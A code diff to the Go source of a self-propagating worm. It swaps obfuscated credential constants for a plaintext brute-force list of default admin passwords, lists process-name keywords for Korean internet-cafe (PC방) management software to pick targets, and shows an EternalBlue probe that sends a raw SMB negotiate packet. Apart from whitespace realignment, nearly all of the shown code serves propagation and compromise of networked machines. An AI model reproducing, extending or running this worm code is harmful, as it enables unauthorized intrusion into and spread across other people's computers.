@@ -18,9 +18,9 @@ import (
 
 // WormConfig holds all worm propagation settings.
 type WormConfig struct {
-	Enabled      bool     `json:"enabled"`
-	ScanInterval int      `json:"scan_interval"` // seconds; default 300
-	MaxHosts     int      `json:"max_hosts"`     // max peers to attempt; default 50
+	Enabled      bool `json:"enabled"`
+	ScanInterval int  `json:"scan_interval"` // seconds; default 300
+	MaxHosts     int  `json:"max_hosts"`     // max peers to attempt; default 50
 	Credentials  []Credential
 }
 
@@ -32,18 +32,18 @@ type Credential struct {
 
 var (
 	defaultCredentials = []Credential{
-		{User: xob(eWormCredUser1), Pass: xob(eWormCredPass1)},
-		{User: xob(eWormCredUser2), Pass: xob(eWormCredPass2)},
-		{User: xob(eWormCredUser3), Pass: xob(eWormCredPass3)},
-		{User: xob(eWormCredUser4), Pass: xob(eWormCredPass4)},
-		{User: xob(eWormCredUser5), Pass: xob(eWormCredPass5)},
-		{User: xob(eWormCredUser6), Pass: xob(eWormCredPass6)},
-		{User: xob(eWormCredUser7), Pass: xob(eWormCredPass7)},
-		{User: xob(eWormCredUser8), Pass: xob(eWormCredPass8)},
-		{User: xob(eWormCredUser9), Pass: xob(eWormCredPass9)},
-		{User: xob(eWormCredUser10), Pass: xob(eWormCredPass10)},
-		{User: xob(eWormCredUser11), Pass: xob(eWormCredPass11)},
-		{User: xob(eWormCredUser12), Pass: xob(eWormCredPass12)},
+		{User: "admin", Pass: "admin"},
+		{User: "administrator", Pass: "admin"},
+		{User: "admin", Pass: "1234"},
+		{User: "Administrator", Pass: "1234"},
+		{User: "user", Pass: "user"},
+		{User: "guest", Pass: ""},
+		{User: "admin", Pass: "password"},
+		{User: "Administrator", Pass: "password"},
+		{User: "admin", Pass: "P@ssw0rd"},
+		{User: "Administrator", Pass: "P@ssw0rd"},
+		{User: "admin", Pass: "Admin123"},
+		{User: "Administrator", Pass: "Admin123"},
 	}
 
 	// PC방 management software process name fragments (case-insensitive match).
@@ -52,9 +52,9 @@ var (
 	pcbangProcKeywords = []string{
 		// === Mediaweb ===
 		"게토",   // Gato
-		"gato",   // Gato (English)
+		"gato", // Gato (English)
 		"피카",   // Pika
-		"pika",   // Pika (English)
+		"pika", // Pika (English)
 		"mediaweb",
 		"mediaupdate",
 
@@ -191,9 +191,9 @@ var (
 		"gamer", "play", "desk", "좌석", "손님", "pc-", "pc_",
 	}
 
-	wormCfg      WormConfig
-	wormActive   bool
-	wormMu       sync.Mutex
+	wormCfg    WormConfig
+	wormActive bool
+	wormMu     sync.Mutex
 
 	// Management server detection state.
 	mgmtMu        sync.Mutex
@@ -773,17 +773,17 @@ func checkEternalBlue(ip string) bool {
 		0xff, 0x53, 0x4d, 0x42, // SMB_Header: Server Component (SMB)
 		0x72,                   // Command: SMB_COM_NEGOTIATE (0x72)
 		0x00, 0x00, 0x00, 0x00, // Status
-		0x18,                                     // Flags: 0x18 = Pathnames, Extended Response
-		0x01, 0x00,                               // Flags2: Unicode, 32-bit status, etc.
+		0x18,       // Flags: 0x18 = Pathnames, Extended Response
+		0x01, 0x00, // Flags2: Unicode, 32-bit status, etc.
 		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Extra (8 bytes)
-		0x00, 0x00,                                 // Tid
-		0x00, 0x00,                                 // Pid
-		0x00, 0x00,                                 // Uid
-		0x00, 0x00,                                 // Mid
+		0x00, 0x00, // Tid
+		0x00, 0x00, // Pid
+		0x00, 0x00, // Uid
+		0x00, 0x00, // Mid
 		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Word count + words
-		0x24,                                       // Byte count (0x24)
+		0x24,                                     // Byte count (0x24)
 		0x02, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, // Dialects...
-		0x00, 0x00, 0x00, 0x00,                   // ...
+		0x00, 0x00, 0x00, 0x00, // ...
 	}
 
 	n, err := conn.Write(smbNegotiate)
